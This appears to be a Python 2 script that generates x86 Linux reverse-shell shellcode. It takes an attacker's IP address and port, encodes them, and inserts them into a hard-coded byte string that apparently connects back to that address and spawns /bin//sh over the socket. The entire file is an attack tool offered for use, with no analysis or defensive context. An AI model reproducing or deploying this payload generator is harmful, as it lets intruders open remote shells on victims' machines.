#!/usr/bin/python

import socket
import sys
import struct

if len(sys.argv) is not 3:
    print "Usage: {0} IP PORT".format(sys.argv[0])
    exit()

ip = socket.inet_aton(sys.argv[1])
port = int(sys.argv[2])

if port < 1 or port > 65535:
    print "Are you kidding?"
    exit()

if port <= 1000:
    print "Port will bind only if run as root"

# ugly code, don't look
port = format(port, '04x')
port = "\\x" + str(port[2:4]) + "\\x" + str(port[0:2])

ip = ip.encode('hex')
ip = "\\x" + ip[0:2] + "\\x" + ip[2:4] + "\\x" + ip[4:6] + "\\x" + ip[6:8]

sc = "\\x99\\x31\\xdb\\x43\\x52\\x53\\x6a\\x02\\x89\\xe1\\x6a\\x66\\x58\\xcd\\x80\\x96\\x43\\x68" + ip + "\\x66\\x68" + port + "\\x05\\x39\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\x43\\xb0\\x66\\xcd\\x80\\x87\\xde\\x31\\xc9\\xb0\\x3f\\xcd\\x80\\x41\\x80\\xf9\\x04\\x75\\xf6\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xd1\\xb0\\x0b\\xcd\\x80"

print "Shellcode generated:"
print sc
